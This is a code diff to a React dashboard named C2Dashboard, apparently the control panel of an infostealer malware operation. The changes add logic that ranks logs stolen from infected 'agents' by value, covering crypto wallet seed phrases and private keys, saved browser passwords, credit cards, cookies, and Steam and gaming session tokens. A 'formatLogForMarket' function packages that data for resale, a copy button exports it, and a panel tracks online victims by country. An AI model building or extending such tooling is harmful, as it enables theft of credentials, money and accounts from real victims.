@@ -576,13 +576,147 @@ const C2Dashboard: React.FC = () => {
 // --- Helper Functions & Components for Overview Tab ---
 
 const isImportantLog = (log: Log) => {
-    if (log.log_type === 'steam') {
-        return true;
+    const { log_type, data } = log;
+    if (!data) return false;
+
+    switch (log_type) {
+        case 'wallets':
+            return Object.values(data).some((wallet_array: any) => 
+                Array.isArray(wallet_array) && wallet_array.some(w => w.seed_phrase || (w.private_keys && w.private_keys.length > 0))
+            );
+        case 'browsers':
+            return Object.values(data.chromium || {}).some((browser: any) => 
+                (browser.logins && browser.logins.length > 0) || (browser.credit_cards && browser.credit_cards.length > 0)
+            ) || Object.values(data.gecko || {}).some((browser: any) => 
+                (browser.logins && browser.logins.length > 0) || (browser.credit_cards && browser.credit_cards.length > 0)
+            );
+        case 'steam':
+            return data.ssfn_files?.length > 0 || data.vdf_files?.length > 0;
+        case 'gaming':
+            return data.battlenet?.session_files?.length > 0 || data.epic_games?.session_files?.length > 0 || data.uplay?.session_files?.length > 0;
+        default:
+            return false;
     }
-    if (log.log_type === 'browsers' && log.data?.logins?.length > 0) {
-        return true;
+};
+
+const hasValuableData = (log: Log): boolean => {
+    const { log_type, data } = log;
+    if (!data) return false;
+
+    switch (log_type) {
+        case 'wallets':
+             return Object.values(data).some((wallet_array: any) => 
+                Array.isArray(wallet_array) && wallet_array.some(w => w.seed_phrase || (w.private_keys && w.private_keys.length > 0) || w.balance)
+            );
+        case 'browsers':
+            return Object.values(data.chromium || {}).some((browser: any) => 
+                (browser.logins && browser.logins.length > 0) || 
+                (browser.credit_cards && browser.credit_cards.length > 0) ||
+                (browser.cookies && browser.cookies.length > 0)
+            ) || Object.values(data.gecko || {}).some((browser: any) => 
+                (browser.logins && browser.logins.length > 0) || 
+                (browser.credit_cards && browser.credit_cards.length > 0) ||
+                (browser.cookies && browser.cookies.length > 0)
+            );
+        case 'steam':
+            return data.ssfn_files?.length > 0 || data.vdf_files?.length > 0 || data.installed_games?.length > 0;
+        case 'gaming':
+            return data.battlenet?.session_files?.length > 0 || data.epic_games?.session_files?.length > 0 || data.uplay?.session_files?.length > 0;
+        case 'processes':
+        case 'network':
+        case 'system_info':
+            return data && Object.keys(data).length > 0;
+        default:
+            return false;
     }
-    return false;
+};
+
+const formatLogForMarket = (log: Log): string => {
+    let output = `##################################################\n`;
+    output += `#                 AGENT DETAILS                  #\n`;
+    output += `##################################################\n`;
+    output += `Hostname:      ${log.hostname || 'N/A'}\n`;
+    output += `Username:      ${log.username || 'N/A'}\n`;
+    output += `Log Timestamp: ${new Date(log.created_at).toUTCString()}\n\n`;
+
+    output += `##################################################\n`;
+    output += `#         LOG TYPE: ${log.log_type.toUpperCase()}         #\n`;
+    output += `##################################################\n\n`;
+    
+    const { data } = log;
+
+    switch (log.log_type) {
+        case 'wallets':
+            Object.entries(data).forEach(([walletName, walletArray]: [string, any]) => {
+                const valuableWallets = walletArray.filter((w: any) => w.seed_phrase || (w.private_keys && w.private_keys.length > 0) || w.balance);
+                if (valuableWallets.length > 0) {
+                    output += `---------- ${walletName.toUpperCase()} ----------\n`;
+                    valuableWallets.forEach((wallet: any, index: number) => {
+                        output += `  [Wallet #${index + 1}]\n`;
+                        output += `  Path:          ${wallet.path}\n`;
+                        if (wallet.balance) output += `  Balance:       ${wallet.balance}\n`;
+                        if (wallet.seed_phrase) output += `  Seed Phrase:   ${wallet.seed_phrase}\n`;
+                        if (wallet.private_keys && wallet.private_keys.length > 0) {
+                            output += `  Private Keys:\n${wallet.private_keys.map((pk: string) => `    - ${pk}`).join('\n')}\n`;
+                        }
+                        output += '\n';
+                    });
+                }
+            });
+            break;
+
+        case 'browsers':
+            const formatBrowser = (browserData: any, browserName: string) => {
+                let browserOutput = '';
+                const { logins, credit_cards, cookies } = browserData;
+                if ((logins?.length || 0) > 0 || (credit_cards?.length || 0) > 0) {
+                     browserOutput += `---------- ${browserName.toUpperCase()} ----------\n`;
+                     if (logins?.length > 0) {
+                         browserOutput += `\n--- Passwords (${logins.length}) ---\n`;
+                         logins.forEach((l: any) => {
+                             browserOutput += `URL: ${l.url} | User: ${l.username} | Pass: ${l.password}\n`;
+                         });
+                     }
+                     if (credit_cards?.length > 0) {
+                         browserOutput += `\n--- Credit Cards (${credit_cards.length}) ---\n`;
+                         credit_cards.forEach((cc: any) => {
+                             browserOutput += `Name: ${cc.name_on_card} | Num: ${cc.card_number} | Exp: ${cc.expiration_month}/${cc.expiration_year}\n`;
+                         });
+                     }
+                      if (cookies?.length > 0) {
+                         browserOutput += `\n--- Cookies (${cookies.length}) ---\n`;
+                         browserOutput += `(Cookie data is extensive and best viewed in the raw JSON format)\n`
+                     }
+                     browserOutput += '\n';
+                }
+                return browserOutput;
+            }
+            Object.entries(data.chromium || {}).forEach(([name, browser]) => output += formatBrowser(browser, `Chromium: ${name}`));
+            Object.entries(data.gecko || {}).forEach(([name, browser]) => output += formatBrowser(browser, `Gecko: ${name}`));
+            break;
+            
+        case 'steam':
+             output += `--- Steam Account ---\n`;
+             if (data.account_name) output += `Account Name: ${data.account_name}\n`;
+             if (data.level) output += `Level:        ${data.level}\n`;
+             if (data.balance) output += `Balance:      ${data.balance}\n\n`;
+             if (data.ssfn_files?.length > 0) {
+                 output += `SSFN Files (session tokens):\n${data.ssfn_files.map((f: string) => `  - ${f}`).join('\n')}\n\n`;
+             }
+             if (data.vdf_files?.length > 0) {
+                 output += `VDF Files (config/login info):\n${data.vdf_files.map((f: string) => `  - ${f}`).join('\n')}\n\n`;
+             }
+             if (data.installed_games?.length > 0) {
+                 output += `Installed Games:\n${data.installed_games.join(', ')}\n`;
+             }
+            break;
+
+        default:
+            output += JSON.stringify(data, null, 2);
+            break;
+    }
+
+    return output;
 };
 
 const OverviewStatCard: React.FC<{ title: string, value: string, subValue?: string, color: string, icon: React.ReactNode }> = ({ title, value, subValue, color, icon }) => (
@@ -596,118 +730,96 @@ const OverviewStatCard: React.FC<{ title: string, value: string, subValue?: stri
     </div>
 );
 
-
 const OverviewTab: React.FC<{agents: Agent[], logs: Log[], logStatsByDay: any[]}> = ({ agents, logs, logStatsByDay }) => {
-  
-  const { importantLogs, regularLogs } = useMemo(() => {
-    const importantLogs = logs.filter(isImportantLog);
-    const regularLogs = logs.filter(log => !isImportantLog(log));
-    return { importantLogs, regularLogs };
-  }, [logs]);
+    
+    const totalLogs = logs.length;
+    const importantLogs = logs.filter(isImportantLog).length;
 
-  const logTypeData = [
-      { name: 'Important Logs', value: importantLogs.length },
-      { name: 'Regular Logs', value: regularLogs.length }
-  ];
+    const totalLogsData = useMemo(() => [
+        { name: 'Important Logs', value: importantLogs, color: '#3b82f6' },
+        { name: 'Regular Logs', value: totalLogs - importantLogs, color: '#4b5563' }
+    ], [logs]);
 
-  const agentsByCountry = useMemo(() => {
-    const counts: Record<string, number> = {};
-    agents.forEach(agent => {
-        const country = agent.country_code || 'XX'; // Default to XX if no country
-        counts[country] = (counts[country] || 0) + 1;
-    });
-    return Object.entries(counts).map(([name, value]) => ({ name, value }));
-  }, [agents]);
+    const onlineAgents = agents.filter(a => a.status === 'active').length;
 
-
-  return (
-      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
-        {/* Top Stat Cards */}
-        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
-           <OverviewStatCard 
-                title="Builder Version" 
-                value="27.5"
-                subValue="Updated: 21-06-2020"
-                color="bg-gray-700"
-                icon={<svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01" /></svg>}
-           />
-           <OverviewStatCard 
-                title="Builder Subscription" 
-                value="Active"
-                subValue="Until 09-07-2020 (17 days)"
-                color="bg-teal-500"
-                icon={<svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>}
-           />
-           <OverviewStatCard 
-                title="Logs" 
-                value={`${logs.length} / ${importantLogs.length}`}
-                subValue={`${regularLogs.length} regular`}
-                color="bg-blue-500"
-                icon={<svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" /></svg>}
-           />
-        </div>
-
-        {/* Main Charts Area */}
-        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
-            {/* Left side: Time series chart */}
-            <div className="lg:col-span-2 bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
-                <h3 className="text-xl font-bold mb-4">Last 30 Days</h3>
-                <ResponsiveContainer width="100%" height={350}>
-                    <AreaChart data={logStatsByDay}>
-                        <defs>
-                            <linearGradient id="colorImportant" x1="0" y1="0" x2="0" y2="1">
-                                <stop offset="5%" stopColor="#3b82f6" stopOpacity={0.8}/>
-                                <stop offset="95%" stopColor="#3b82f6" stopOpacity={0}/>
-                            </linearGradient>
-                            <linearGradient id="colorRegular" x1="0" y1="0" x2="0" y2="1">
-                                <stop offset="5%" stopColor="#14b8a6" stopOpacity={0.8}/>
-                                <stop offset="95%" stopColor="#14b8a6" stopOpacity={0}/>
-                            </linearGradient>
-                        </defs>
-                        <CartesianGrid strokeDasharray="3 3" stroke="rgba(255, 255, 255, 0.1)" />
-                        <XAxis dataKey="date" stroke="#8892b0" fontSize={12} />
-                        <YAxis stroke="#8892b0" fontSize={12} />
-                        <Tooltip contentStyle={{ backgroundColor: '#1a202c', border: '1px solid #4a5568' }}/>
-                        <Legend />
-                        <Area type="monotone" dataKey="important" name="Important Logs" stroke="#3b82f6" fillOpacity={1} fill="url(#colorImportant)" />
-                        <Area type="monotone" dataKey="regular" name="Regular Logs" stroke="#14b8a6" fillOpacity={1} fill="url(#colorRegular)" />
-                    </AreaChart>
-                </ResponsiveContainer>
+    return (
+        <div className="space-y-6">
+            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+                <OverviewStatCard 
+                    title="Online Agents" 
+                    value={onlineAgents.toString()} 
+                    subValue={`/ ${agents.length} total`}
+                    color="text-green-400"
+                    icon={<svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.206" /></svg>}
+                />
+                <OverviewStatCard 
+                    title="Total Logs" 
+                    value={totalLogs.toString()}
+                    subValue={`${importantLogs} important`}
+                    color="text-blue-400"
+                    icon={<svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" /></svg>}
+                />
             </div>
 
-            {/* Right side: Donut chart and Map */}
-            <div className="space-y-8">
-                <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
-                    <h3 className="text-xl font-bold mb-4">Total Logs ({logs.length})</h3>
-                     <ResponsiveContainer width="100%" height={200}>
-                        <PieChart>
-                            <Pie 
-                                data={logTypeData} 
-                                dataKey="value" 
-                                nameKey="name" 
-                                cx="50%" 
-                                cy="50%" 
-                                innerRadius={60} 
-                                outerRadius={80} 
-                                fill="#8884d8" 
-                                paddingAngle={5}
-                            >
-                                <Cell key={`cell-0`} fill="#3b82f6" />
-                                <Cell key={`cell-1`} fill="#14b8a6" />
-                            </Pie>
+            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                <div className="lg:col-span-2 bg-gray-800/50 rounded-lg p-6 border border-gray-700/50">
+                    <h3 className="text-xl font-bold mb-4">Last 30 Days</h3>
+                    <ResponsiveContainer width="100%" height={350}>
+                        <AreaChart data={logStatsByDay}>
+                            <defs>
+                                <linearGradient id="colorImportant" x1="0" y1="0" x2="0" y2="1">
+                                    <stop offset="5%" stopColor="#3b82f6" stopOpacity={0.8}/>
+                                    <stop offset="95%" stopColor="#3b82f6" stopOpacity={0}/>
+                                </linearGradient>
+                                <linearGradient id="colorRegular" x1="0" y1="0" x2="0" y2="1">
+                                    <stop offset="5%" stopColor="#14b8a6" stopOpacity={0.8}/>
+                                    <stop offset="95%" stopColor="#14b8a6" stopOpacity={0}/>
+                                </linearGradient>
+                            </defs>
+                            <CartesianGrid strokeDasharray="3 3" stroke="rgba(255, 255, 255, 0.1)" />
+                            <XAxis dataKey="date" stroke="#8892b0" fontSize={12} />
+                            <YAxis stroke="#8892b0" fontSize={12} />
                             <Tooltip contentStyle={{ backgroundColor: '#1a202c', border: '1px solid #4a5568' }}/>
                             <Legend />
-                        </PieChart>
+                            <Area type="monotone" dataKey="important" name="Important Logs" stroke="#3b82f6" fillOpacity={1} fill="url(#colorImportant)" />
+                            <Area type="monotone" dataKey="regular" name="Regular Logs" stroke="#14b8a6" fillOpacity={1} fill="url(#colorRegular)" />
+                        </AreaChart>
                     </ResponsiveContainer>
                 </div>
-                <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
-                    <h3 className="text-xl font-bold mb-4">Agents by Country</h3>
-                    <AgentsWorldMap agents={agents} />
+
+                <div className="space-y-8">
+                    <div className="bg-gray-800/50 rounded-lg p-6 border border-gray-700/50">
+                        <h3 className="text-xl font-bold mb-4">Total Logs ({totalLogs})</h3>
+                        <ResponsiveContainer width="100%" height={200}>
+                            <PieChart>
+                                <Pie 
+                                    data={totalLogsData} 
+                                    dataKey="value" 
+                                    nameKey="name" 
+                                    cx="50%" 
+                                    cy="50%" 
+                                    innerRadius={60} 
+                                    outerRadius={80} 
+                                    fill="#8884d8" 
+                                    paddingAngle={5}
+                                >
+                                    {totalLogsData.map((entry, index) => (
+                                        <Cell key={`cell-${index}`} fill={entry.color} />
+                                    ))}
+                                </Pie>
+                                <Tooltip contentStyle={{ backgroundColor: '#1a202c', border: '1px solid #4a5568' }}/>
+                                <Legend />
+                            </PieChart>
+                        </ResponsiveContainer>
+                    </div>
+                    <div className="bg-gray-800/50 rounded-lg p-6 border border-gray-700/50">
+                        <h3 className="text-xl font-bold mb-4">Agents by Country</h3>
+                        <AgentsWorldMap agents={agents} />
+                    </div>
                 </div>
             </div>
         </div>
-      </motion.div>
-  );
+    );
 }
 
 const AgentsWorldMap: React.FC<{ agents: Agent[] }> = ({ agents }) => {
@@ -772,7 +884,6 @@ const AgentsWorldMap: React.FC<{ agents: Agent[] }> = ({ agents }) => {
     );
 };
 
-
 const StatCard: React.FC<{title: string, value: number | string, color?: string}> = ({ title, value, color = 'text-white' }) => (
     <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
         <h3 className="text-csfloat-light/70 text-sm mb-2">{title}</h3>
@@ -822,6 +933,17 @@ const LogViewer: React.FC<{log: Log}> = ({ log }) => {
     const [selectedSite, setSelectedSite] = React.useState<string>('');
     const [sortKey, setSortKey] = React.useState<'name' | 'value'>('name');
     const [sortAsc, setSortAsc] = React.useState<boolean>(true);
+    const [showRaw, setShowRaw] = React.useState<boolean>(false);
+    const [copied, setCopied] = React.useState<boolean>(false);
+
+    const isValuable = hasValuableData(log);
+    const formattedData = isValuable ? formatLogForMarket(log) : '';
+
+    const handleCopy = () => {
+        navigator.clipboard.writeText(formattedData);
+        setCopied(true);
+        setTimeout(() => setCopied(false), 2000);
+    };
 
     // Helper to extract all cookies grouped by domain/site
     const getCookiesBySite = (data: any) => {
@@ -922,13 +1044,40 @@ const LogViewer: React.FC<{log: Log}> = ({ log }) => {
     }
 
     return (
-        <div className="bg-csfloat-darker rounded p-4 border border-csfloat-gray/10">
-            <pre className="text-white text-sm whitespace-pre-wrap">
-                {JSON.stringify(log.data, null, 2)}
-            </pre>
+        <div>
+            <div className="flex justify-between items-center mb-4">
+                <div className="flex items-center space-x-4">
+                    <button
+                        onClick={() => setShowRaw(!showRaw)}
+                        className="px-3 py-1 text-sm rounded bg-gray-600 hover:bg-gray-500 transition-colors"
+                    >
+                        {showRaw ? 'Show Formatted' : 'Show Raw JSON'}
+                    </button>
+                    {isValuable && !showRaw && (
+                         <button
+                            onClick={handleCopy}
+                            className="px-3 py-1 text-sm rounded bg-blue-600 hover:bg-blue-500 transition-colors"
+                        >
+                            {copied ? 'Copied!' : 'Copy Log'}
+                        </button>
+                    )}
+                </div>
+            </div>
+
+            {!isValuable && !showRaw &&(
+                <div className="bg-yellow-900/50 border border-yellow-700 text-yellow-300 rounded p-4 text-center">
+                    <p className="font-bold">No High-Value Information Detected</p>
+                    <p className="text-sm">This log does not appear to contain sensitive credentials like passwords, private keys, or seed phrases. You can view the full raw data.</p>
+                </div>
+            )}
+
+             <div className="mt-4 bg-csfloat-darker rounded p-4 border border-csfloat-gray/10 max-h-[60vh] overflow-y-auto">
+                <pre className="text-white text-sm whitespace-pre-wrap">
+                    {showRaw ? JSON.stringify(log.data, null, 2) : (isValuable ? formattedData : JSON.stringify(log.data, null, 2))}
+                </pre>
+            </div>
         </div>
     );
 };
-
 
 export default C2Dashboard; 
